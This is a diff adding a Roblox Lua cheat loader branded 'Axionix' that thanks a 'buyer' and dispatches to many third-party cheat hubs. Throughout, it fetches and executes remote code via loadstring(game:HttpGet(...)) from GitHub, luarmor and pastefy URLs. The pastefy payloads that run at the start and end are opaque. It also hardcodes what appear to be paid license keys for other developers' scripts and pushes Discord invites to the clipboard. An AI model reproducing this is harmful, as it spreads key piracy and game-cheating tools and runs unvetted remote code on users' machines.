@@ -1,0 +1,148 @@
+loadstring(game:HttpGet("https://pastefy.app/MtsB3VJt/raw"))()
+print("Axionix")
+local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
+OrionLib:MakeNotification({
+	Name = "Notification",
+	Content = "Hi Buyer",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
+print("Axionix")
+OrionLib:MakeNotification({
+	Name = "Notification",
+	Content = "Thank You For Purchasing My Script",
+	Image = "rbxassetid://4483345998",
+	Time = 4
+})
+print("Axionix")
+OrionLib:MakeNotification({
+	Name = "Notification",
+	Content = "Please Enjoy My Script",
+	Image = "rbxassetid://4483345998",
+	Time = 3
+})
+print("Axionix")
+OrionLib:MakeNotification({
+	Name = "Notification",
+	Content = "Https://discord.gg/kSR25VUymD",
+	Image = "rbxassetid://4483345998",
+	Time = 4
+})
+print("Axionix")
+if _G.Script == "MaruHub" then
+   getgenv().Key = "MARU-0ZIBP-HP5E-XU4UU-HC4M-9RGFU"
+   getgenv().id = "1244913105998184458"
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/xshiba/MaruBitkub/main/Mobile.lua"))()
+elseif _G.Script == "RoyXHub" then
+   _G.Key = "XT1W2-FBBNX-2A9O8"
+   _G.DiscordId = "1003662302412820622"
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Natsuhanaki/Royx_PC/main/loader.lua"))();
+elseif _G.Script == "XenonHubTTD" then
+   getgenv().key = '295306171272'
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/Xenon-Trash/Loader/main/Loader.lua'))()
+elseif _G.Script == "XenonHubBF" then
+   getgenv().key = '253046870001'
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/Xenon-Trash/Loader/main/Loader.lua'))()
+elseif _G.Script == "XenonHubAD" then
+   getgenv().key = '116079394428'
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/Xenon-Trash/Loader/main/Loader.lua'))()
+elseif _G.Script == "BananaHubMainBF" then
+   repeat wait() until game:IsLoaded() and game.Players.LocalPlayer 
+   getgenv().Key = "396f5fecb4bebc7ddfa29832" 
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/main/BananaHub.lua"))()
+elseif _G.Script == "BananaHubKaitunBF" then
+   repeat wait() until game:IsLoaded() and game.Players.LocalPlayer
+   getgenv().Key = "396f5fecb4bebc7ddfa29832"
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/main/BananaCat-kaitunBF.lua"))()
+elseif _G.Script == "BananaHubKaitunAD" then
+   repeat wait() until game:IsLoaded() and game.Players.LocalPlayer
+   getgenv().Key = "396f5fecb4bebc7ddfa29832"
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/main/BananaCat-KaitunAD.lua"))()
+elseif _G.Script == "BananaHubBountyBF" then
+   repeat wait()
+   until game:IsLoaded() and game.Players.LocalPlayer
+   getgenv().Key = "396f5fecb4bebc7ddfa29832"
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/main/BananaCat-BountyEz.lua"))()
+elseif _G.Script == "SwitchHubKaitun" then
+   script_key="OxOplIcQxuvNbZOgnqTJEKMZKlNpMAXD";
+   loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/58876769bc015b00b9a3008484e99085.lua"))()
+elseif _G.Script == "SwitchHubCapcut" then
+   script_key="PaSCTwQLohEFmbVkRCsxGSHXYXEzGIcw";
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/londnee/code/main/screenshot.lua"))()
+elseif _G.Script == "W-AzurePremiumTrueV2" then
+   script_key = "NFaiJJBtJSEdOdmjUXSxqXKKWnmsRTcA"
+   loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3b2169cf53bc6104dabe8e19562e5cc2.lua"))()
+elseif _G.Script == "W-AzurePremiumADSender" then
+   script_key = "NFaiJJBtJSEdOdmjUXSxqXKKWnmsRTcA"
+   loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3051457467c11f25288cfe2de3708373.lua"))()
+elseif _G.Script == "W-AzurePremiumADMain" then
+   script_key = "NFaiJJBtJSEdOdmjUXSxqXKKWnmsRTcA"
+   if getgenv().Loaded  then
+       return 
+   end
+   loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/57d5eebd9b111f1639a5970102487168.lua"))()
+elseif _G.Script == "W-AzurePremiumADOneClick" then
+   script_key = "NFaiJJBtJSEdOdmjUXSxqXKKWnmsRTcA"
+   if getgenv().Loaded  then
+       return 
+   end
+   loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/950b9999b1274e4d6f9fadc85fe2d77e.lua"))()
+elseif _G.Script == "W-AzurePremiumBountyV2" then
+   script_key = "NFaiJJBtJSEdOdmjUXSxqXKKWnmsRTcA"
+   loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b6d24ef1f7dab9c7b22f259a3db6c47e.lua"))()
+elseif _G.Script == "W-AzurePremiumBountyV2.2" then
+   script_key = "NFaiJJBtJSEdOdmjUXSxqXKKWnmsRTcA"
+   loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/248f97d7a28a4d09c641d8279a935333.lua"))()
+end
+print("Axionix")
+getgenv().Key = "https://discord.com/invite/cx2Fpsr3ry"
+Key1 = getgenv().Key
+getgenv().id = "https://discord.com/invite/cx2Fpsr3ry"
+ID1 = getgenv().id
+getgenv().Key = "https://discord.com/invite/cx2Fpsr3ry"
+Key2 = getgenv().Key
+getgenv().key = "https://discord.com/invite/cx2Fpsr3ry"
+Key3 = getgenv().key
+getgenv().key = 'https://discord.com/invite/cx2Fpsr3ry'
+Key4 = getgenv().key
+getgenv().key = 'https://discord.com/invite/cx2Fpsr3ry'
+Key5 = getgenv().key
+script_key="https://discord.com/invite/cx2Fpsr3ry";
+Key6 = script_key
+script_key = "https://discord.com/invite/cx2Fpsr3ry";
+Key7 = script_key
+_G.Key = "https://discord.com/invite/cx2Fpsr3ry"
+Key8 = _G.Key
+_G.DiscordId = "https://discord.com/invite/cx2Fpsr3ry"
+ID2 = _G.DiscordId
+script_key = "https://discord.com/invite/cx2Fpsr3ry"
+Key9 = _G.Key
+script_key ='https://discord.com/invite/cx2Fpsr3ry'
+Key10 = script_key
+print("Axionix")
+loadstring(game:HttpGet("https://pastefy.app/ZZywpFb7/raw"))()
+setclipboard(ID1)
+print("Axionix")
+setclipboard(ID2)
+print("Axionix")
+setclipboard(Key1)
+print("Axionix")
+setclipboard(Key2)
+print("Axionix")
+setclipboard(Key3)
+print("Axionix")
+setclipboard(Key4)
+print("Axionix")
+setclipboard(Key5)
+print("Axionix")
+setclipboard(Key6)
+print("Axionix")
+setclipboard(Key7)
+print("Axionix")
+setclipboard(Key8)
+print("Axionix")
+setclipboard(Key9)
+print("Axionix")
+setclipboard(Key10)
+print("Axionix")
+loadstring(game:HttpGet("https://pastefy.app/ZZywpFb7/raw"))()
